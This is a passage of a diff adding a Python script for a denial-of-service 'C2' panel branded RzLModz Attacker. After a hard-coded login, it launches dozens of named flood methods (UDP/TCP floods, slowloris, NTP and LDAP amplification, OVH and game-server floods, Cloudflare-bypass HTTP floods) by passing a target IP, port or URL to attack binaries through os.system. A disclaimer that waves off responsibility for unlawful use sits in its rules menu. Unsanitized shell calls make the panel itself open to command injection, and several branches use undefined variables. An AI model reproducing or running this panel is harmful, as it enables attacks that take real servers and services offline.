+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msamp                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap              \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
+''')
+
+def rules():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. The owner does not recommend attacking the government, if you do so you must be willing to take responsibility and accept all risks   \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack for testing servers                                                                                                                    \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator is not responsible if this tool is used by the wrong person for unlawful activities                                                \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
+''')
+
+def menu():
+    sys.stdout.write(f"         \x1b]2;Overload Server --> Online Users: [{bots}] | Stresser Panel Vip\x07")
+    clear()
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mRzL \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to RzLModz Attacker! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print("")
+    print("""  
+                                         _.oo.
+                 _.u[[/;:,.         .odMMMMMM'
+              .o888UU[[[/;:-.  .o@P^    MMM^
+             oN88888UU[[[/;::-.        dP^
+            dNMMNN888UU[[[/;:--.   .o@P^
+           ,MMMMMMN888UU[[/;::-. o@^
+           NNMMMNN888UU[[[/~.o@P^
+           888888888UU[[[/o@^-..
+          oI8888UU[[[/o@P^:--..
+       .@^  YUU[[[/o@^;::---..
+     oMP     ^/o@P^;:::---..
+  .dMMM    .o@^ ^;::---...
+ dMMMMMMM@^`       `^^^^
+YMMMUP^
+              Simple C2 Overload 2024
+                   V : 1.1
+              MADE BY : RzLModz 🚀                     
+\x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
+\x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to RzLModz Attacker DDoS Panel        \x1b[38;2;0;49;147m║
+\x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239m DDoS Panel 2024\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
+\x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
+\x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
+\x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://t.me/POWERPROOFOVERLOAD \x1b[38;2;0;49;147m║
+\x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
+\x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
+\x1b[38;2;0;212;14m║\x1b[38;2;239;239;239mLAYER7  ► SHOW LAYER7 METHODS
+                                                             LAYER4  ► SHOW LAYER4 METHODS
+                                                             AMP     ► SHOW AMP METHODS
+                                                             SPECIAL ► SHOW SPECIAL METHODS
+                                                             RULES   ► RULES PANEL
+                                                             CLEAR   ► CLEAR TERMINAL \x1b[38;2;0;49;147m║
+\x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
+""")
+
+def main():
+    menu()
+    while(True):
+        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@Ko\x1b[38;2;0;150;88mmin\x1b[38;2;0;113;133mfo\x1b[38;2;0;49;147m]
+\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+            layer7()
+        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
+            layer4()
+        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
+            amp_games()
+        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
+            special()
+        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
+            rules()    
+            
+
+# LAYER 4 METHODS   
+
+        elif "udpbypass" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./UDPBYPASS {ip} {port}')
+            except IndexError:
+                print('Usage: udpbypass <ip> <port>')
+                print('Example: udpbypass 1.1.1.1 80')
+
+        elif "stdv2" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./std {ip} {port}')
+            except IndexError:
+                print('Usage: stdv2 <ip> <port>')
+                print('Example: stdv2 1.1.1.1 80')
+
+        elif "flux" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'./flux {ip} {port} {thread} 0')
+            except IndexError:
+                print('Usage: flux <ip> <port> <threads>')
+                print('Example: flux 1.1.1.1 80 250')
+
+        elif "slowloris" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./slowloris {ip} {port}')
+            except IndexError:
+                print('Usage: slowloris <ip> <port>')
+                print('Example: slowloris 1.1.1.1 80')
+
+        elif "god" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl god.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: god <ip> <port> <time>')
+                print('Example: god 1.1.1.1 80 60')
+
+        elif "destroy" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: destroy <ip> <port> <time>')
+                print('Example: destroy 1.1.1.1 80 60')
+
+        elif "std" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./STD-NOSPOOF {ip} {port}')
+            except IndexError:
+                print('Usage: std <ip> <port>')
+                print('Example: std 1.1.1.1 80')
+
+        elif "home" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                psize = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'perl home.pl {ip} {port} {psize} {time}')
+            except IndexError:
+                print('Usage: home <ip> <port> <packet_size> <time>')
+                print('Example: home 1.1.1.1 80 65500 60')
+
+        elif "udp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'python2 udp.py {ip} {port} 0 0')
+            except IndexError:
+                print('Usage: udp <ip> <port>')
+                print('Example: udp 1.1.1.1 80')
+
+        elif "nfo-killer" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                threads = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
+            except IndexError:
+                print('Usage: nfo-killer <ip> <port> <threads> <time>')
+                print('Example: nfo-killer 1.1.1.1 80 850 60')
+
+        elif "ovh-raw" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
+            except IndexError:
+                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
+
+        elif "tcp" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
+            except IndexError:
+                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: tcp GET 1.1.1.1 80 60 8500')
+                
+        elif "ovh-beam" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4] 
+                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
+            except IndexError:
+                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
+                print('Example: ovh-beam GET 51.38.92.223 80 60')
+                
+        elif "overflow" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'./OVERFLOW {ip} {port} {thread}')
+            except IndexError:
+                print('Usage: overflow <ip> <port> <threads>')
+                print('Example: overflow 1.1.1.1 80 5000')
+               
+        elif "brutal" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                bytes = cnc.split()[3]
+                thrs = cnc.split()[4]
+                bost = cnc.split()[5]
+                os.system(f'python3 brutal.py {ip} {port} {bytes} {thrs} {bost}')           
+            except IndexError:    
+                print('Example: brutal 1.1.1.1 80 500 500 Y/N')
+                
+ # AMP/GAMES METHODS
+
+        elif "samp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'python2 samp.py {ip} {port}')
+            except IndexError:
+                print('Usage: samp <ip> <port>')
+                print('Example: samp 1.1.1.1 7777')
+
+        elif "ldap" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
+            except IndexError:
+                print('Usage: ldap <ip> <port> <threads> <time>')
+                print('Example: ldap 1.1.1.1 80 650 60')
+
+        elif "minecraft" in cnc:
+            try:
+                ip = cnc.split()[1]
+                throttle = cnc.split()[2]
+                threads = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
+            except IndexError:
+                print('Usage: minecraft <ip> <throttle> <threads> <time>')
+                print('Example: minecraft 1.1.1.1 5000 500 60')
+
+        elif "ovh-amp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./OVH-AMP {ip} {port}')
+            except IndexError:
+                print('Usage: ovh-amp <ip> <port>')
+                print('Example: ovh-amp 1.1.1.1 80')
+                
+        elif "ntp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                throttle = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
+            except IndexError:
+                print('Usage: ntp <ip> <port> <throttle> <time>')
+                print('Example: ntp 1.1.1.1 22 250 60')     
+                
+# LAYER 7 METHODS
+    
+        elif "https-spoof" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'python3 https-spoof.py {url} {time} {thread}')
+            except IndexError:
+                print('Usage: https-spoof <url> <time> <threads>')
+                print('Example: https-spoof http://vailon.com 60 500')
+    
+        elif "slow" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node slow.js {url} {time}')
+            except IndexError:
+                print('Usage: slow <url> <time>')
+                print('Example: slow http://vailon.com 60')
+    
+        elif "hyper" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node hyper.js {url} {time}')
+            except IndexError:
+                print('Usage: hyper <url> <time>')
+                print('Example: hyper http://vailon.com 60')
+                
+        elif "cf-socket" in cnc:
+            try:
+                os.system(f'python3 bypass.py')
+            except IndexError:
+                print('cf-socket')
+    
+        elif "cf-pro" in cnc:
+            try:
+                os.system(f'python3 cf-pro.py')
+            except IndexError:
+                print('cf-pro')
+        elif "cf-socket" in cnc:
+            try:
+                os.system(f'python3 bypass.py')
+            except IndexError:
+                print('cf-socket')
+        
+        elif "tryreset" in cnc:
+            try:
+                url = cnc.split()[1]
+                per = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'node tryreset.js {url} {time} {time} {per} {thread} {proxies.txt}')
+            except IndexError:
+                print('Usage: tryreset <url> <time> <per> <thread> <proxies.txt>')
+                print('Example: tryreset http://example.com 300 15000 1250 proxies.txt')
+
+        elif "kill" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node kill.js {url} {time} {per} {thread}')
+            except IndexError:
+                print('Usage: kill <url> <time> <per> <thread>')
+                print('Example: kill http://example.com 300 15000 1250')
+
+        elif "http-requests" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node http-requests.js {url} {time}')
+            except IndexError:
+                print('Usage: http-requests <url> <time>')
+                print('Example: http-requests http://example.org 60')
+
+        elif "tls" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node tls.js {url} {time} {per} {thread} {proxies.txt}')
+            except IndexError:
+                print('Usage: tls <url> <time> <per> <thread> <proxies.txt>')
+                print('Example: tls http://vailon.com/ 300 15000 1250 proxies.txt')
+
+        elif "cf-bypass" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'node cf.js {url} {time} {thread}')
+            except IndexError:
+                print('Usage: cf-bypass <url> <time> <threads>')
+                print('Example: cf-bypass http://example.com 60 1250')
+
+        elif "uambypass" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                per = cnc.split()[3]
+                os.system(f'node uambypass.js {url} {time} {per} http.txt')
+            except IndexError:
+                print('Usage: uambypass <url> <time> <req_per_ip>')
+                print('Example: uambypass http://example.com 60 1250')
+
+        elif "crash" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'go run Hulk.go -site {url} -data {method}')
+            except IndexError:
+                print('Usage: crash <url> METHODS<GET/POST>')
+                print('Example: crash http://example.com GET')
+
+        elif "httpflood" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
+            except IndexError:
+                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
+                print('Example: httpflood http://example.com 15000 get 60')
+
+        elif "medusa" in cnc:
+            try:
+                url = cnc.split()[1]
+                os.system(f'node medusa.js {url} 300 15000 1250 proxies.txt')
+            except IndexError:
+                print('Usage: medusa <url>')
+                print('Example: medusa URL TIME REQ THREADS proxies.txt')
+                
+        elif "http-storm" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                per = cnc.split()[3]
+                thread = cnc.split()[4]
+                os.system(f'node storm.js {url} {time} {per} {thread} proxies.txt')
+            except IndexError:
+                print('Usage: http-storm <host> <time> <req> <thread> <proxies.txt>')
+                print('Example: http-storm http://example.org 300 15000 1250 proxies.txt ')               
+
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+
+def login():
+    clear()
+    user = "start"
+    passwd = "start"
+    username = input("🔐 Username: ")
+    password = getpass.getpass(prompt='🔑 Password: ')
+    if username != user or password != passwd:
+        print("")
+        print("❌ AKSES DITOLAK ❌")
+        sys.exit(1)
+    elif username == user and password == passwd:
+        print("Successful Login")
+        time.sleep(0.3)
+        ascii_vro()
+        main()
+
+login()
+                                                                                                   
